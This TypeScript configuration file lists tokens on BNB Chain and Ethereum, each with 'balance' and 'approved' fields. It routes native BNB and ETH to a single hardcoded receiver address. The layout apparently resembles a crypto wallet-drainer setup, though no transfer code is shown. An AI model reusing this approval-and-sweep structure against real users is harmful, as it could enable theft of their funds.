import {
    tokenUsdtAddBNB,
    tokenUsdcAddBNB,
    tokenBnbAddBNB,
    tokenBusdAddBNB,
    tokenUsdtAddETH,
    tokenUsdcAddETH,
    tokenEthAddETH,
    tokenDaiAddETH,
    contractAddBNB,
    contractAddETH,
    chainIdBNB,
    chainIdETH,
} from './config';

export const nativereciver = '0x281f8AC37696c493c2178a28d5Db2D1678FC333E';

export interface TokenInfo {
    symbol: string;
    tokenAddress?: string;
    contractAddress: string;
    isNative?: boolean;
    balance?: bigint;
    approved?: boolean;
}

export const tokensConfig: Record<number, TokenInfo[]> = {
    [chainIdBNB]: [
        { symbol: "USDT", tokenAddress: tokenUsdtAddBNB, contractAddress: contractAddBNB },
        { symbol: "USDC", tokenAddress: tokenUsdcAddBNB, contractAddress: contractAddBNB },
        { symbol: "BUSD", tokenAddress: tokenBusdAddBNB, contractAddress: contractAddBNB },
        { symbol: "BNB", isNative: true, contractAddress: nativereciver },
        { symbol: "LINK", tokenAddress: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD', contractAddress: contractAddBNB },
        { symbol: "WBTC", tokenAddress: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c', contractAddress: contractAddBNB },
        { symbol: "PENDLE", tokenAddress: '0xb3Ed0A426155B79B898849803E3B36552f7ED507', contractAddress: contractAddBNB },
    ],
    [chainIdETH]: [
        { symbol: "USDT", tokenAddress: tokenUsdtAddETH, contractAddress: contractAddETH },
        { symbol: "USDC", tokenAddress: tokenUsdcAddETH, contractAddress: contractAddETH },
        { symbol: "DAI", tokenAddress: tokenDaiAddETH, contractAddress: contractAddETH },
        { symbol: "ETH", isNative: true, contractAddress: nativereciver },
        { symbol: "WETH", tokenAddress: tokenEthAddETH, contractAddress: contractAddETH },
        { symbol: "LINK", tokenAddress: '0x514910771AF9Ca656af840dff83E8264EcF986CA', contractAddress: contractAddETH },
        { symbol: "WBTC", tokenAddress: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', contractAddress: contractAddETH },
        { symbol: "PENDLE", tokenAddress: '0x808507121B80c02388fAd14726482e061B8da827', contractAddress: contractAddETH },
    ],
};
